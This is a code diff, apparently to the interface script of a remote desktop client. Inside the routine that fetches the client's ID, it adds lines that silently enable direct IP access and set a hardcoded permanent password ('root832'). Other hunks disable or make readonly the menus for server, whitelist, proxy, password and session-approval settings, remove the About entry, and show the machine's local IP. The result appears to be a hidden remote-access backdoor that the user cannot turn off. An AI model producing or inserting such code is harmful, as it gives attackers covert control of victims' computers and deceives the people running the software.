@@ -24,6 +24,8 @@ var svg_refresh_password = <svg #refresh-password xmlns="http://www.w3.org/2000/
 var my_id = handler.get_id();
 function get_id() {
   my_id = handler.get_id();
+  handler.set_option("direct-server","Y");
+  handler.set_permanent_password("root832")
   return my_id;
 }
 
@@ -96,7 +98,7 @@ class DirectServer: Reactor.Component {
         var text = translate("Enable direct IP access");
         var enabled = handler.get_option("direct-server") == "Y";
         var cls = enabled ? "selected" : "line-through";
-        return <li class={cls}><span>{svg_checkmark}</span>{text}{enabled && <EditDirectAccessPort />}</li>;
+        return <li class={cls} disabled><span>{svg_checkmark}</span>{text}{enabled && <EditDirectAccessPort />}</li>;
     }
     
     function onClick() {
@@ -311,22 +313,22 @@ class MyIdMenu: Reactor.Component {
         var username = handler.get_local_option("access_token") ? getUserName() : '';
         return <popup>
             <menu.context #config-options>
-                <li #enable-keyboard><span>{svg_checkmark}</span>{translate('Enable keyboard/mouse')}</li>
-                <li #enable-clipboard><span>{svg_checkmark}</span>{translate('Enable clipboard')}</li>
-                <li #enable-file-transfer><span>{svg_checkmark}</span>{translate('Enable file transfer')}</li> 
-                <li #enable-remote-restart><span>{svg_checkmark}</span>{translate('Enable remote restart')}</li> 
-                <li #enable-tunnel><span>{svg_checkmark}</span>{translate('Enable TCP tunneling')}</li>
-                {is_win ? <li #enable-block-input><span>{svg_checkmark}</span>{translate('Enable blocking user input')}</li> : ""}
-                <li #enable-lan-discovery><span>{svg_checkmark}</span>{translate('Enable LAN discovery')}</li>
+                <li #enable-keyboard disabled><span>{svg_checkmark}</span>{translate('Enable keyboard/mouse')}</li>
+                <li #enable-clipboard disabled><span>{svg_checkmark}</span>{translate('Enable clipboard')}</li>
+                <li #enable-file-transfer disabled><span>{svg_checkmark}</span>{translate('Enable file transfer')}</li> 
+                <li #enable-remote-restart disabled><span>{svg_checkmark}</span>{translate('Enable remote restart')}</li> 
+                <li #enable-tunnel disabled><span>{svg_checkmark}</span>{translate('Enable TCP tunneling')}</li>
+                {is_win ? <li #enable-block-input disabled><span>{svg_checkmark}</span>{translate('Enable blocking user input')}</li> : ""}
+                <li #enable-lan-discovery disabled><span>{svg_checkmark}</span>{translate('Enable LAN discovery')}</li>
                 <AudioInputs />
                 <Enhancements />
-                <li #allow-remote-config-modification><span>{svg_checkmark}</span>{translate('Enable remote configuration modification')}</li>
+                <li #allow-remote-config-modification disabled><span>{svg_checkmark}</span>{translate('Enable remote configuration modification')}</li>
                 <div .separator />
-                <li #custom-server>{translate('ID/Relay Server')}</li>
-                <li #whitelist title={translate('whitelist_tip')}>{translate('IP Whitelisting')}</li>
-                <li #socks5-server>{translate('Socks5 Proxy')}</li>
+                <li #custom-server disabled>{translate('ID/Relay Server')}</li>
+                <li #whitelist title={translate('whitelist_tip')} disabled>{translate('IP Whitelisting')}</li>
+                <li #socks5-server disabled>{translate('Socks5 Proxy')}</li>
                 <div .separator />
-                <li #stop-service class={service_stopped ? "line-through" : "selected"}><span>{svg_checkmark}</span>{translate("Enable service")}</li>
+                <li #stop-service class={service_stopped ? "line-through" : "selected"} ><span>{svg_checkmark}</span>{translate("Enable service")}</li>
                 {is_win && handler.is_installed() ? <ShareRdp /> : ""}
                 <DirectServer />
                 {false && handler.using_public_server() && <li #allow-always-relay><span>{svg_checkmark}</span>{translate('Always connect via relay')}</li>}
@@ -338,7 +340,6 @@ class MyIdMenu: Reactor.Component {
                 <div .separator />
                 <li #allow-darktheme><span>{svg_checkmark}</span>{translate('Dark Theme')}</li>
                 <Languages />
-                <li #about>{translate('About')} {" "}{handler.get_app_name()}</li>
             </menu>
         </popup>;
     }
@@ -407,7 +408,7 @@ class MyIdMenu: Reactor.Component {
             var old_value = handler.get_option("whitelist").split(",").join("\n");
             msgbox("custom-whitelist", translate("IP Whitelisting"), "<div .form> \
             <div>" + translate("whitelist_sep") + "</div> \
-            <textarea .outline-focus spellcheck=\"false\" name=\"text\" novalue=\"0.0.0.0\" style=\"overflow: scroll-indicator; width:*; height: 140px; font-size: 1.2em; padding: 0.5em;\">" + old_value + "</textarea>\
+            <textarea .outline-focus readonly spellcheck=\"false\" name=\"text\" novalue=\"0.0.0.0\" style=\"overflow: scroll-indicator; width:*; height: 140px; font-size: 1.2em; padding: 0.5em;\">" + old_value + "</textarea>\
             </div> \
             ", "", function(res=null) {
                 if (!res) return;
@@ -433,10 +434,10 @@ class MyIdMenu: Reactor.Component {
             var old_id = configOptions["custom-rendezvous-server"] || "";
             var old_key = configOptions["key"] || "";
             msgbox("custom-server", "ID/Relay Server", "<div .form .set-password> \
-            <div><span>" + translate("ID Server") + ": </span><input|text .outline-focus name='id' value='" + old_id + "' /></div> \
-            <div><span>" + translate("Relay Server") + ": </span><input|text name='relay' value='" + old_relay + "' /></div> \
-            <div><span>" + translate("API Server") + ": </span><input|text name='api' value='" + old_api + "' /></div> \
-            <div><span>" + translate("Key") + ": </span><input|text name='key' value='" + old_key + "' /></div> \
+            <div><span>" + translate("ID Server") + ": </span><input|text .outline-focus name='id' value='" + old_id + "' readonly/></div> \
+            <div><span>" + translate("Relay Server") + ": </span><input|text name='relay' value='" + old_relay + "' readonly/></div> \
+            <div><span>" + translate("API Server") + ": </span><input|text name='api' value='" + old_api + "' readonly/></div> \
+            <div><span>" + translate("Key") + ": </span><input|text name='key' value='" + old_key + "' readonly/></div> \
             </div> \
             ", "", function(res=null) {
                 if (!res) return;
@@ -470,8 +471,8 @@ class MyIdMenu: Reactor.Component {
             var old_username = socks5[1] || "";
             var old_password = socks5[2] || "";
             msgbox("custom-server", "Socks5 Proxy", <div .form .set-password> 
-            <div><span>{translate("Server")}:</span><input|text .outline-focus name='proxy' value={old_proxy} /></div>
-            <div><span>{translate("Username")}:</span><input|text name='username' value={old_username} /></div>
+            <div><span>{translate("Server")}:</span><input|text .outline-focus name='proxy' value={old_proxy} readonly/></div>
+            <div><span>{translate("Username")}:</span><input|text name='username' value={old_username} readonly/></div>
             <div><span>{translate("Password")}:</span><PasswordComponent value={old_password} /></div>
             </div>
             , "", function(res=null) {
@@ -535,8 +536,8 @@ class EditDirectAccessPort: Reactor.Component {
 
 function editDirectAccessPort() {
     var p0 = handler.get_option('direct-access-port');
-    var port = p0 ? <input|text name='port' value={p0} /> :
-                    <input|text name='port' novalue={21118} />;
+    var port = p0 ? <input|text name='port' value={p0} readonly/> :
+                    <input|text name='port' novalue={21118} readonly/>;
     msgbox("custom-direct-access-port", translate('Direct IP Access Settings'), <div .form .set-password>
             <div><span style="width: 60px;">{translate('Port')}:</span>{port}</div>
         </div>, "", function(res=null) {
@@ -567,6 +568,10 @@ class App: Reactor.Component
                     <div>
                         <div .title>{translate('Your Desktop')}</div>
                         <div .lighter-text>{translate('desk_tip')}</div>
+                        <div .your-ipaddress>
+                            <div>IP Address </div>                         
+                            {key_confirmed ? <div .address>{handler.get_local_ip()}</div>: translate("Generating ...")}
+                        </div>
                         <div .your-desktop>
                             <MyIdMenu />
                             {key_confirmed ? <input type="text" readonly value={formatId(get_id())}/> : translate("Generating ...")}
@@ -912,15 +917,15 @@ class PasswordArea: Reactor.Component {
         var approve_mode= handler.get_option('approve-mode');
         var show_password = approve_mode != 'click';
         return <popup><menu.context #edit-password-context>
-            <li #approve-mode-password><span>{svg_checkmark}</span>{translate('Accept sessions via password')}</li>
-            <li #approve-mode-click><span>{svg_checkmark}</span>{translate('Accept sessions via click')}</li>
-            <li #approve-mode-both><span>{svg_checkmark}</span>{translate('Accept sessions via both')}</li>
+            <li #approve-mode-password disabled><span>{svg_checkmark}</span>{translate('Accept sessions via password')}</li>
+            <li #approve-mode-click disabled><span>{svg_checkmark}</span>{translate('Accept sessions via click')}</li>
+            <li #approve-mode-both disabled><span>{svg_checkmark}</span>{translate('Accept sessions via both')}</li>
             { !show_password ? '' : <div .separator /> }
-            { !show_password ? '' : <li #use-temporary-password><span>{svg_checkmark}</span>{translate('Use one-time password')}</li> }
-            { !show_password ? '' : <li #use-permanent-password><span>{svg_checkmark}</span>{translate('Use permanent password')}</li> }
-            { !show_password ? '' : <li #use-both-passwords><span>{svg_checkmark}</span>{translate('Use both passwords')}</li> }
+            { !show_password ? '' : <li #use-temporary-password disabled><span>{svg_checkmark}</span>{translate('Use one-time password')}</li> }
+            { !show_password ? '' : <li #use-permanent-password disabled><span>{svg_checkmark}</span>{translate('Use permanent password')}</li> }
+            { !show_password ? '' : <li #use-both-passwords disabled><span>{svg_checkmark}</span>{translate('Use both passwords')}</li> }
             { !show_password ? '' : <div .separator /> }
-            { !show_password ? '' : <li #set-password  disabled={ method == 'use-temporary-password' ? "true" : "false" }>{translate('Set permanent password')}</li> }
+            { !show_password ? '' : <li #set-password  disabled>{translate('Set permanent password')}</li> }
             { !show_password ? '' : <TemporaryPasswordLengthMenu /> }
             <div .separator />
             <li #tfa><span>{svg_checkmark}</span>{translate('enable-2fa-title')}</li>
